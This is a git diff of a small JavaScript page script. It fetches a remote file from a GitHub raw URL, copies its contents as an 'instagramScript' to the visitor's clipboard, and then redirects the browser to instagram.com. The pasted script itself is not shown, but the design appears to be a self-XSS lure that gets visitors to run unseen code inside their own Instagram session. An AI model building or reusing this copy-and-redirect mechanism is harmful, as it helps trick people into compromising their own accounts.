@@ -1,12 +1,7 @@
-/* ARQUIVO: copiar.js */
+const RAW_URL = "https://raw.githubusercontent.com/jaum1502/site-v21/main/codigo.txt";
 
-// URL RAW do arquivo no GitHub
-const RAW_URL = "https://raw.githubusercontent.com/jaum1502/site-v21/main/test.txt";
-
-// variável que vai receber o código gigante
 let instagramScript = "";
 
-// carrega o arquivo ao abrir a página
 fetch(RAW_URL)
   .then(res => {
     if (!res.ok) throw new Error("Erro ao carregar o arquivo");
@@ -23,7 +18,6 @@ fetch(RAW_URL)
     alert("Falha ao carregar o código");
   });
 
-// --- FUNÇÃO PARA COPIAR E REDIRECIONAR ---
 async function copyToClipboard() {
   try {
     if (!instagramScript) {
@@ -35,7 +29,6 @@ async function copyToClipboard() {
     overlayControl("show");
 
       window.location.href = "https://instagram.com";
-   
 
   } catch (error) {
     console.error("Failed to copy text:", error);
@@ -53,3 +46,4 @@ function overlayControl(state) {
     overlay.classList.remove("show");
   }
 }
+
